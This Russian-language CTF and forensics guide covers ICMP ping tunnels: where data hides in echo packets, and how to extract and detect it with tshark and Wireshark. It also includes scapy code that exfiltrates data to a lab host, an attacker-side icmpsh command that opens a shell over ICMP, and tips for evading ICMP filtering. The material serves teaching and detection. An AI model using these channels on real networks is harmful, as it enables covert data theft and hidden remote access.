ICMP — служебный протокол, который почти всегда разрешён наружу (иначе не работает диагностика сети). Это делает его идеальным носителем для скрытого канала: полезная нагрузка эхо-запроса (`ping`) может содержать произвольные данные, а сеть и логи обычно фиксируют только факт «кто-то пингует», не вглядываясь в содержимое. Ping-туннели — один из самых старых и живучих способов эксфильтрации.

## Анатомия ICMP-эхо и где спрятать данные

Эхо-запрос (`type 8`) и эхо-ответ (`type 0`) имеют заголовок из 8 байт: тип, код, контрольная сумма, **идентификатор** и **последовательность**. После заголовка идёт поле данных произвольной длины.

Каналы для сокрытия:

- **Поле данных (payload).** Основной канал: сюда пишут блоки файла или команды.
- **Поле identifier.** 16 бит — можно кодировать номер потока или два байта данных.
- **Поле sequence.** 16 бит — ещё два байта на пакет.
- **Размер полезной нагрузки.** Разные размеры кодируют биты.
- **Тайминги.** Интервалы между пакетами кодируют биты (медленный, но незаметный канал).

Идентификатор и последовательность часто выглядят «как у настоящего ping» (например, ID = PID процесса), поэтому для детекта сравнивают их поведение с эталоном.

## Инструменты и команды

- **`scapy`** — сборка/разбор ICMP-пакетов в Python.
- **`tshark`** — фильтрация и извлечение поля данных ICMP.
- **`icmpsh`**, **`ptunnel`** — готовые туннели.
- **`hping3`** — ручная отправка ICMP с заданным payload.
- **`ping -p`** — встроенный способ задать hex-pattern данных.

Извлечь данные из всех ICMP-пакетов pcap:

```bash
tshark -r icmp.pcap -Y "icmp" -T fields -e ip.src -e icmp.type \
  -e icmp.seq -e data.data
```

Отправить ping с произвольным payload через `hping3`:

```bash
hping3 -1 -c 3 -d 40 -E payload.bin 10.0.0.5
```

## Разобранный пример: данные в payload

Пусть в pcap видно, что пакеты содержат читаемый текст. Вытащим его:

```bash
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data | head
666c61677b69636d705f74756e6e656c7d
```

Данные в hex — декодируем:

```bash
$ tshark -r icmp.pcap -Y 'icmp.type==8' -T fields -e data.data \
  | tr -d '\n' | xxd -r -p
flag{icmp_tunnel}
```

Если данные в поле `identifier`, используем его как поток байт:

```bash
$ tshark -r icmp.pcap -Y 'icmp' -T fields -e icmp.ident | head
0x6c66
```

## Построение канала через scapy

Сборка эхо-запроса с данными в payload:

```python
from scapy.all import IP, ICMP, send

msg = b"flag{hidden}"
pkt = IP(dst="10.0.0.5") / ICMP(type=8, id=0x1337) / msg
send(pkt, verbose=False)
```

Кодирование блока в поле идентификатора и последовательности (по 2 байта на пакет):

```python
from scapy.all import IP, ICMP, send

data = b"EXFIL"
for i in range(0, len(data), 2):
    chunk = data[i:i+2].ljust(2, b"\x00")
    ident = int.from_bytes(chunk, "big")
    send(IP(dst="10.0.0.5")/ICMP(type=8, id=ident, seq=i), verbose=False)
```

Получатель собирает байты в обратном порядке по `seq`.

## Готовые туннели

`ptunnel` и `icmpsh` поднимают полноценный TCP-туннель поверх ICMP. `icmpsh` работает в режиме клиент–сервер: клиент на скомпрометированном хосте шлёт эхо-запросы, сервер отвечает эхо-ответами, и внутри этого канала течёт shell.

```bash
# на стороне атакующего
./icmpsh_m.py 10.0.0.10 10.0.0.5
```

Такие туннели детектируются по: аномально большому ICMP-трафику, крупным payload, нестандартным ID/seq, высокой частоте.

## Обнаружение и анализ

Методика:

1. `tshark -z io,stat,1 -Y icmp` — всплески ICMP во времени.
2. Сравнить размеры payload с обычным ping (обычно 32–56 байт).
3. Проверить ID/seq: растут ли они монотонно, как у настоящего `ping`.
4. Извлечь payload и проверить на текст/base64/hex.
5. Проверить тайминги: равномерность может скрывать биты.

```bash
tshark -r icmp.pcap -Y icmp -T fields -e frame.time_relative -e icmp.seq -e data.len
```

## Частые ошибки и подводные камни

- **Игнорировать поля ID/seq**, искать только в payload.
- **Забыть про эхо-ответ.** Ответ сервера тоже несёт данные.
- **Не учитывать порядок.** Пакеты могут прийти не по порядку — сортируйте по `seq`.
- **Путать hex и текст.** `tshark` отдаёт `data.data` в hex.
- **Пропустить тайминговый канал.** Если payload пуст, посмотрите интервалы.
- **Считать ICMP редким.** В туннеле он становится основным трафиком.

## Таблица каналов в ICMP

| Канал | Ёмкость на пакет | Заметность | Стойкость |
|---|---|---|---|
| Payload | десятки–тысячи байт | средняя | высокая |
| Identifier | 2 байта | низкая | средняя |
| Sequence | 2 байта | низкая | средняя |
| Размер payload | несколько бит | низкая | средняя |
| Тайминги | 1 бит/пакет | очень низкая | низкая (шум) |

## Что дальше / решение

- Соберите ICMP-трафик: `tshark -Y icmp -T fields -e data.data`.
- Декодируйте hex (`xxd -r -p`), проверьте base64.
- Если payload пуст — смотрите `icmp.ident`/`icmp.seq` и тайминги.
- Для детекта сравнивайте размеры и частоту с эталонным ping.
- Дальше — TCP-поля (`stego-covert-tcp`) и каналы по длине (`stego-covert-length`).

## ICMPv6 и другие типы сообщений

Помимо классического эхо (type 8/0), ICMP имеет множество типов: destination unreachable, time exceeded, redirect, а в ICMPv6 — neighbour solicitation/advertisement, router advertisement. Каждый тип несёт своё тело, и не все из них строго проверяются. В IPv6 neighbour discovery поля `Nonce` и `Target Link-Layer Address` — хорошее место для данных, потому что они «случайны» по природе.

```bash
tshark -r v6.pcap -Y "icmpv6" -T fields -e icmpv6.type -e icmpv6.nd.ns.target_address | head
```

Практический вывод: если эхо-пакеты в трафике выглядят чисто, проверьте остальные типы ICMP — канал может быть в redirect или в ICMPv6 ND.

## Кодирование и коррекция ошибок

ICMP-канал по своей природе ненадёжен: пакеты теряются, приходят не по порядку, дублируются. Чтобы сообщение собиралось корректно, применяют:

- **Порядковый номер в sequence** — по нему сортируют пакеты.
- **CRC/контрольную сумму** — чтобы отбрасывать битые блоки.
- **Избыточное кодирование** — повтор блока, мажоритарное голосование.
- **Подтверждения** — эхо-ответ как ack.

Простейший формат кадра в payload: `[seq:4][len:2][data][crc:2]`. Получатель собирает блоки по `seq`, проверяет `crc` и склеивает. Это резко повышает надёжность на реальной сети.

## Пропускная способность и её оценка

Пропускная способность ICMP-туннеля ограничена размером payload и частотой пакетов. При payload 1000 байт и 100 пакетах в секунду получается около 100 КБ/с в идеале, но на практике — в разы меньше из-за потерь и rate-limiting. Именно аномальная частота и крупный payload выдают туннель: настоящий `ping` шлёт 32–56 байт раз в секунду.

```bash
tshark -r icmp.pcap -Y icmp -T fields -e data.len \
  | sort -n | uniq -c | sort -rn | head
```

Если гистограмма длин резко смещена к большим значениям — это сигнал.

## Обход фильтрации

Многие сети блокируют ICMP целиком, но часто пропускают конкретные типы (например, разрешают эхо-запрос, но запрещают ответ). Обходы:

- **Использовать разрешённый тип** (echo request) и прятать данные в нём.
- **Мимикрия под `ping`** — ID = PID, стабильный размер, ровный интервал.
- **Фрагментация** — большие данные в фрагментированных ICMP.
- **Смешанный трафик** — данные размазать между ICMP и DNS.

В CTF это редко требуется, но в реальных сетях без обхода канал просто не поднимется.

## Разбор в Wireshark

Графический путь: `Statistics → Protocol Hierarchy` покажет долю ICMP; `Analyze → Expert Information` подсветит аномалии. Для payload: правый клик на пакете → `Follow → UDP/ICMP Stream` (для эхо) покажет склейку. Фильтр отображения `icmp` + колонка длины быстро выявляет подозрительные пакеты.

## Готовые утилиты и их флаги

- **`icmpsh`**: `-t` (target), `-s` (source) — простой shell-туннель.
- **`ptunnel`**: `-p` (proxy), `-lp` (listen port), `-da` (destination address) — TCP-over-ICMP.
- **`hping3`**: `-1` (ICMP mode), `-d` (data size), `-E` (payload file), `-c` (count).
- **`nping`**: `--icmp`, `--data`, `--data-string` — гибкая отправка.

```bash
nping --icmp --data-string "flag{test}" -c 1 10.0.0.5
```

Эти же инструменты — основа детекта: их поведение (частые крупные ICMP) легко отличить от обычного ping.
